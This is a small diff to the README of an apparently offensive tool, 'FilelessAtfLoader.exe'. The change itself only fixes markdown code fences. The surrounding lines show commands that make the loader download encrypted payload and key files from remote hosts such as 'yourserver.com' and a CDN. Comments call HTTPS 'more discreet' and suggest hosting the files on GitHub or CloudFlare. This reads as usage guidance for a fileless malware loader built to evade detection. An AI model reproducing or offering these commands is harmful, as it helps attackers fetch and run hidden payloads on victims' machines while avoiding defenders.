@@ -93,6 +93,8 @@ FilelessAtfLoader.exe https://yourserver.com/cipher_chacha20.bin https://yourser
 
 REM AES - HTTPS URLs (more discreet)
 FilelessAtfLoader.exe https://yourserver.com/cipher.bin https://yourserver.com/key.bin
+```
+
 ### **1. GitHub hosting**
 ```bash
 # ChaCha20 - Upload your encrypted files to GitHub
@@ -128,7 +130,7 @@ FilelessAtfLoader.exe https://cdn.yoursite.com/cipher_chacha20.bin https://cdn.y
 
 # AES - Via CloudFlare or other CDN
 FilelessAtfLoader.exe https://cdn.yoursite.com/cipher.bin https://cdn.yoursite.com/key
----
+```
 
 ## **Advanced usage examples**
 
